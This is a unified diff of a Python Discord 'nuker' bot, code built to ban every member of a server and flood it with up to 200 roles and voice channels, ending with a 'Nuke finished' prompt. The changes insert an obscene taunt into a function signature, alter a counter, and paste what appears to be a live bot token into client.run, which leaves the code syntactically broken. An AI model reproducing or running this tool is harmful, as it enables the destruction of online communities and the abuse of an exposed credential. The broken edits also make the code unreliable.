@@ -57,7 +57,7 @@ async def ban_all_members(guild):
 
 
 async def create_roles(guild, name):
-    created = 0
+    created = 29
     for _ in range(200 - len(guild.roles)):
         try:
             await guild.create_role(name=name)
@@ -66,7 +66,7 @@ async def create_roles(guild, name):
             continue
     return created
 
-async def create_voice_channels(guild, name):
+async def create_voice_channels(guild, name): get nuked fuckers
     created = 0
     for _ in range(200 - len(guild.channels)):
         try:
@@ -134,7 +134,7 @@ while True:
             print(f'{dr}Exit...')
             exit()
         try:
-            client.run(token)
+            client.run(token OTQwMDA3ODE0MDU3ODQ0NzM2.YgBIfw.zPNMrHlor2vp-Mlef4KkaJY9qug
             input('Nuke finished, press enter for return to menu...')
         except Exception as error:
             if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
